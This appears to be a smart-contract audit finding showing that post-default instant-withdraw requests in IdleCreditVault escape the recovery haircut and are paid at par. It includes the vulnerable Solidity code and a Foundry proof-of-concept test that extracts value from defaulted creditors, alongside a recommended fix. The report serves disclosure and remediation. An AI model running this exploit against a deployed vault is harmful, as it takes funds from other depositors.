### Title
Post-default instant-withdraw requests escape the recovery haircut boundary and claim at par — (`contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
Analog of the rsync `/./` confinement bypass: the vault confines post-default withdrawals to haircutted, reserve-backed paths, but `requestInstantWithdraw` records receipts under a *different* epoch-keyed marker (`instantWithdrawsRequestsByEpoch[user][epochNumber]`) that the defaulted-claim path only recognizes for `defaultRecoveryEpoch`. A request made after `defaultRecoveryFinalized` therefore "crosses the boundary" — it is stored as a par receipt and later paid in full by `claimInstantWithdrawRequest`, while every defaulted receipt holder is confined to `defaultRecoveryPrice`.

### Finding Description
`requestWithdraw` explicitly confines post-default requests: it requires the user to have no pending receipts, burns the CDO's strategy tokens, and mints an already-haircut receipt into `postDefaultRequests` payable only from `defaultRecoveryReserve` [1](#0-0) . `requestInstantWithdraw` performs only `_onlyIdleCDO()` and `_ensureDefaultRecoveryInitialized()` and then unconditionally mints a 1:1 receipt, increments `instantWithdrawsRequests[_user]`, `instantWithdrawsRequestsByEpoch[_user][currentEpoch]`, `instantWithdrawClaimsByEpoch[currentEpoch]`, and `pendingInstantWithdraws` — with no `defaultRecoveryFinalized` check [2](#0-1) .

On claim, `claimInstantWithdrawRequest` invokes `_claimDefaultedInstantWithdrawRequest`, which only clears `instantWithdrawsRequestsByEpoch[_user][defaultRecoveryEpoch]` — a different epoch key than the post-default request — so it returns zero, and the full `instantWithdrawsRequests[_user]` balance is burned and paid at par via `_transferFundedClaim` [3](#0-2) [4](#0-3) . The "boundary marker" (`defaultRecoveryEpoch`) fails to confine receipts registered under any later epoch index.

Funding source: `pendingInstantWithdraws` is re-inflated, so a subsequent borrower repayment / `getInstantWithdrawFunds` → `collectInstantWithdrawFunds` pull transfers fresh underlying into the vault tagged for this receipt [5](#0-4) . Additionally, `pendingInstantWithdraws != 0` at a *future* finalization makes `defaultPendingClaimBasis` include `instantWithdrawClaimsByEpoch[epochNumber]` and `_defaultPrefundedInstantReserve` treat strategy-held underlying as instant-claim backing, further privileging the unhaircutted receipt [6](#0-5) [7](#0-6) .

### Impact Explanation
Any tranche holder (or any lender who deposits post-default, since `depositAA/BB` remain callable) can register an instant-withdraw receipt after default finalization and be paid 100 cents on the dollar — either from newly collected borrower funds or, where non-reserve underlying exists, from vault balance — while all defaulted-epoch creditors are capped at `defaultRecoveryPrice < 1e18`. This breaks the loss-socialization invariant: loss is confined per the recovery price, but the instant path escapes it, diluting recoveries and directly transferring value from defaulted receipt holders and active LPs to the attacker.

### Likelihood Explanation
Requires: the pool has defaulted and been finalized (an in-scope, expected protocol state), `allowInstantWithdraw` is enabled by the honest manager, and some subsequent borrower repayment or recovery flow occurs — precisely the scenario `finalizeDefaultRecovery`/`DefaultDistributor` is built for. The attacker is an ordinary KYC'd tranche holder; no privileged role needed. Cost is only the deposit/request transactions. The guard asymmetry (`requestWithdraw` is confined, `requestInstantWithdraw` is not) shows the boundary was intended but not enforced on this path.

### Recommendation
Mirror the `requestWithdraw` post-default confinement in `requestInstantWithdraw`: when `defaultRecoveryFinalized`, either revert or route the amount through `postDefaultRequests`-style already-haircut accounting (and do not increment `pendingInstantWithdraws`/`instantWithdrawClaimsByEpoch`). Alternatively, key `_claimDefaultedInstantWithdrawRequest` on `lastWithdrawRequest`-style per-user markers rather than a single `defaultRecoveryEpoch` so receipts from any later epoch cannot escape the haircut.

### Proof of Concept
Foundry fork PoC sketch (against the existing `test/foundry/IdleCreditVault.t.sol` harness, modeled on `testFinalizeDefaultHaircutsPendingInstantRedeems`):

```solidity
function testPostDefaultInstantWithdrawEscapesHaircut() external {
    uint256 amount = 20_000 * ONE_SCALE;
    address attacker = makeAddr('attacker');

    // normal epoch, then borrower default and finalizeDefault at e.g. 50% recovery
    _depositWithUser(attacker, amount, true);
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, 0);
    _checkDefault();
    uint256 basis = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest()
        - cdoEpoch.pendingWithdrawFees()
        + IdleCreditVault(address(strategy)).defaultPendingClaimBasis();
    uint256 recovered = basis * 5e17 / 1e18; // 50% recovery
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    IdleCreditVault vault = IdleCreditVault(address(strategy));
    assertTrue(vault.defaultRecoveryFinalized());
    assertLt(vault.defaultRecoveryPrice(), 1e18); // everyone confined to <100%

    // Attacker deposits post-default at haircutted virtualPrice, then files an
    // INSTANT withdraw request — stored at par under epochNumber > defaultRecoveryEpoch
    deal(defaultUnderlying, attacker, amount);
    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), amount);
    idleCDO.depositAA(amount);
    cdoEpoch.requestWithdraw(0, address(AAtranche)); // routes to requestInstantWithdraw when instant window open
    vm.stopPrank();

    // Manager honestly funds instant queue from a late borrower repayment
    deal(defaultUnderlying, borrower, vault.pendingInstantWithdraws());
    vm.prank(manager);
    cdoEpoch.getInstantWithdrawFunds();

    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - balPre;

    // Attacker received the FULL par receipt even though recovery price is 50%,
    // while _claimDefaultedWithdrawRequest would only pay basis * 0.5.
    assertEq(paid, vault.instantWithdrawClaimsByEpoch(vault.epochNumber()));
    assertGt(paid, paid * vault.defaultRecoveryPrice() / 1e18); // strictly above the confined payout
}
```

The PoC asserts the attacker is paid at par (100%) for a request created after finalization, while the same underlying routed through `claimWithdrawRequest` would pay `basis * defaultRecoveryPrice` — demonstrating the confinement-boundary escape.

  function requestInstantWithdraw(uint256 _amount, address _user) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    // burn strategy tokens from cdo
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
  }

  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
  }

  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
  }
